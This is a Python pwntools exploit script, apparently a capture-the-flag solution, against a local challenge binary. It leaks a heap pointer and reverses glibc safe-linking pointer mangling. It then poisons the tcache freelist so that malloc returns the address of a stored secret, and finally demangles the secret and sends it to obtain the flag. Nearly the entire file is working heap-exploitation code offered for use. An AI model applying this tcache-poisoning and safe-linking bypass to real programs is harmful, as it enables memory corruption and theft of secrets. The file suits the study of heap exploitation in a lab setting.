# indirect memcpy @ https://youtu.be/-a9wVdxT88g?si=6uQ3muZbipDpORFZ&t=1076
# refer to above for a technique used to copy data from one address to another via heap
# take a look at tcache_get() method and PROTECT_PTR, REVEAL_PTR to understand the formula

from pwn import *

p = process("/challenge/seeking-safe-secrets-hard")

def demangle(mangled_ptr):
    mid = mangled_ptr ^ (mangled_ptr >> 12)
    return mid ^ (mid >> 24)

def mangle(pos, ptr):
    return ptr ^ (pos >> 12)

x = p.clean()
#secret_stack_addr = int(x.split(b"stored at")[1].split(b".")[0].split(b" ")[1], 16)
secret_stack_addr = 0x425600

print("[+] Leaked Secret (stack) address is :: ", hex(secret_stack_addr))

p.sendline(b"malloc 0 32")
p.sendline(b"malloc 1 32")
p.sendline(b"malloc 2 32")
p.sendline(b"malloc 3 32")

print(p.clean())

p.sendline(b"free 0")
p.sendline(b"free 1")
p.sendline(b"free 2")

print(p.clean())

p.sendline(b"puts 2")
x = p.clean()
leaked_heap_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16)
demangled_heap_addr = demangle(leaked_heap_addr)

print("[+] (Demangled) Leaked Heap address is :: ", hex(demangled_heap_addr))

mangled_addr = mangle(demangled_heap_addr, secret_stack_addr) # +0x8 to get rest of the secret

print("[+] (Mangled) Target address is :: ", hex(mangled_addr))

p.sendline(b"scanf 2")
p.sendline(p64(mangled_addr))

print(p.clean())

p.sendline(b"malloc 4 32") # now our secret_addr is at head

print(p.clean())

p.sendline(b"malloc 5 32") # now our secret is at head

print(p.clean())

p.sendline(b"free 3") # we copied secret to 3rd allocated addr

print(p.clean())

p.sendline(b"puts 3")

print()
x = p.clean()

print(x)

mangled_leaked_8_bytes = int(hex(int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16))[18:], 16)

print("[+] (mangled) Leaked 8 Bytes :: ", hex(mangled_leaked_8_bytes))
print()

print("[+] Demangling -> f(demangled_heap_leaked_address, leaked_8_bytes) -> f(stack_secret_address, result_from_previous)")
print("[+] formula => hex((leaked_8_bytes ^ (key & 0xfffff000) >> 12))")

first_demangle = (mangled_leaked_8_bytes ^ ((demangled_heap_addr & 0xfffff000) >> 12))
final_demangle = (first_demangle ^ ((secret_stack_addr & 0xfffff000) >> 12))

print("[+] First Demangle Leaked 8 bytes Secret :: ", hex(first_demangle))
print("[+] Final Demangle Leaked 8 bytes Secret :: ", hex(final_demangle))

obtained_8_bytes_secret = final_demangle.to_bytes(8, "little")

print("[+] Obtained 8 Bytes Secret :: ", obtained_8_bytes_secret.decode())

p.sendline(b"send_flag")
p.sendline(obtained_8_bytes_secret)

print(p.clean())

p.close()
